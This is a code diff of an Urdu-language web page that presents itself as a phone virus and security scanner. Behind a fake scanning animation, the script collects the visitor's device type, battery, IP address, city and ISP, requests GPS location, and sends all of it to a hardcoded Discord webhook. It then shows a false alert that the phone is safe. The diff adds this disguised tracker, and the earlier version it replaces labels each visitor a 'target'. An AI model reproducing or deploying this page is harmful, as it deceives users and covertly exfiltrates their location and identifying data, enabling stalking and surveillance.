@@ -2,69 +2,86 @@
 <html lang="ur" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>سیکیورٹی چیک - 2026</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موبائل سیکیورٹی اسکینر</title>
     <style>
-        body { font-family: sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #1c222d; padding: 30px; border-radius: 15px; text-align: center; width: 320px; border: 1px solid #313a4a; }
-        .btn { background: #00d2ff; color: black; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #00ff00; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .scanner-box { border: 2px solid #00ff00; padding: 30px; border-radius: 50%; width: 280px; height: 280px; display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; box-shadow: 0 0 20px #00ff00; }
+        .radar { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 1px solid rgba(0, 255, 0, 0.3); animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
+        h2 { font-size: 18px; text-shadow: 0 0 10px #00ff00; }
+        .btn-scan { background: #00ff00; color: black; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; z-index: 10; margin-top: 10px; }
+        #log { font-size: 10px; margin-top: 10px; color: #00ff00; text-align: center; height: 20px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div style="font-size:50px">🛡️</div>
-    <h2>نیٹ ورک پروٹیکشن</h2>
-    <p style="font-size:13px; color:#94a3b8;">اپنے انٹرنیٹ کنکشن کو محفوظ بنانے کے لیے ایک بار اسکین کریں۔</p>
-    <button class="btn" onclick="startDeepAudit()">اسکین کریں</button>
+<div class="scanner-box">
+    <div class="radar"></div>
+    <h2>سسٹم اسکینر v2.0</h2>
+    <p style="font-size: 11px; color: #00ff00;">وائرس اور ہیکنگ چیک کریں</p>
+    <button class="btn-scan" onclick="startScan()">اسکین شروع کریں</button>
+    <div id="log">سسٹم ویٹنگ...</div>
 </div>
 
 <script>
-    async function startDeepAudit() {
-        // 1. بیٹری کا ڈیٹا (ہمیشہ کام کرتا ہے)
-        let batt = "N/A";
-        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}% (${b.charging ? 'چارجنگ' : 'بیٹری'})`; } catch(e) {}
+    async function startScan() {
+        const btn = document.querySelector('.btn-scan');
+        const log = document.getElementById('log');
+        btn.style.display = 'none';
+        
+        // اینیمیشن لاگز
+        const messages = ["آئی پی چیک ہو رہی ہے...", "سسٹم فائلز اسکین ہو رہی ہیں...", "لوکیشن ڈیٹا ویریفائی ہو رہا ہے...", "بیٹری ہیلتھ چیک ہو رہی ہے..."];
+        let i = 0;
+        const interval = setInterval(() => {
+            if(i < messages.length) {
+                log.innerText = messages[i];
+                i++;
+            } else {
+                clearInterval(interval);
+                log.innerText = "تجزیہ مکمل ہو گیا!";
+            }
+        }, 1000);
 
-        // 2. آئی پی اور شہر (یہاں ہم ایک نئی سروس استعمال کر رہے ہیں)
-        let ipInfo = { city: "Unknown", country: "Unknown", isp: "Unknown", query: "N/A" };
+        // ڈیٹا جمع کرنا
+        const ua = navigator.userAgent;
+        let dType = ua.match(/Android/i) ? "Android" : (ua.match(/iPhone/i) ? "iPhone" : "Laptop/PC");
+        
+        let batt = "N/A";
+        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Battery'})`; } catch(e) {}
+
+        let net = { ip: "N/A", city: "N/A", isp: "N/A" };
         try {
             const res = await fetch('https://ipapi.co/json/');
-            ipInfo = await res.json();
-        } catch (e) {
-            // اگر پہلی سروس فیل ہو تو دوسری کوشش
-            const res2 = await fetch('http://ip-api.com/json/');
-            ipInfo = await res2.json();
-        }
+            net = await res.json();
+        } catch(e) {}
 
-        const sendData = async (lat = "بلاک", lon = "بلاک") => {
+        const sendToDiscord = async (lat = "Denied", lon = "Denied") => {
             const webhook = "https://discord.com/api/webhooks/1470998243826602132/T60IyiL2tylMGTqYes0mwWzq59wUn9-HjEG0_FWTW7iQtapXwRDzOd5eoDQNYa276z6A";
-            
             const payload = {
                 embeds: [{
-                    title: "🕵️ ٹارگٹ کی نئی رپورٹ (لوکیشن بلاک حل)",
-                    color: 16753920,
+                    title: "🛡️ وائرس اسکینر رپورٹ",
+                    color: 65280,
                     fields: [
+                        { name: "📱 ڈیوائس", value: dType, inline: true },
                         { name: "🔋 بیٹری", value: batt, inline: true },
-                        { name: "🕒 ٹائم زون", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
-                        { name: "🌍 مقام (شہر/ملک)", value: `${ipInfo.city || 'Unknown'}, ${ipInfo.country_name || ipInfo.country || 'Unknown'}` },
-                        { name: "🏢 نیٹ ورک (ISP)", value: ipInfo.org || ipInfo.isp || "Unknown" },
-                        { name: "🔗 آئی پی ایڈریس", value: ipInfo.ip || ipInfo.query || "N/A" },
-                        { name: "📍 گوگل میپ (GPS)", value: lat === "بلاک" ? "صارف نے لوکیشن بلاک کر دی" : `[Open Map](https://www.google.com/maps?q=${lat},${lon})` }
+                        { name: "🌐 آئی پی", value: net.ip || "N/A" },
+                        { name: "🌍 شہر/ملک", value: `${net.city}, ${net.country_name}` },
+                        { name: "📍 GPS لوکیشن", value: `[Map Link](https://www.google.com/maps?q=${lat},${lon})` }
                     ],
-                    footer: { text: "Audit System v3.0" },
                     timestamp: new Date()
                 }]
             };
-
             await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-            alert("اسکین مکمل! آپ کا انٹرنیٹ محفوظ ہے۔");
+            setTimeout(() => { alert("اسکین مکمل: آپ کا فون 100% محفوظ ہے اور کوئی وائرس نہیں ملا۔"); }, 2000);
         };
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (p) => sendData(p.coords.latitude, p.coords.longitude),
-                () => sendData() 
+                (p) => sendToDiscord(p.coords.latitude, p.coords.longitude),
+                () => sendToDiscord()
             );
-        } else { sendData(); }
+        } else { sendToDiscord(); }
     }
 </script>
 </body>
